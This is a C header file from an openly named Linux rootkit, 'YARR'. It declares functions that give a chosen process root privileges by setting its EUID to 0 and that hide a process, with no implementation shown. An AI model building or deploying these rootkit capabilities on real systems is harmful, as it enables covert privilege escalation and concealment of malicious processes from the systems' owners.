/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_OPERATIONS
#define __YARR_OPERATIONS

#include <linux/types.h>

/***
 * Gives to the process identified by pid superuser privileges by seting its
 * EUID to 0.
 *
 * @pid: The PID process to give privileges.
 * @return: Zero on success or -1 if there were errors.
 */
int givePrivileges(pid_t pid);

/***
 * Hides a process.
 *
 * @pid: The PID of the process to be hide.
 * @return: Zero on success or -1 if there were errors.
 */
int hideProcess(pid_t pid);

#endif /* __YARR_OPERATIONS. */
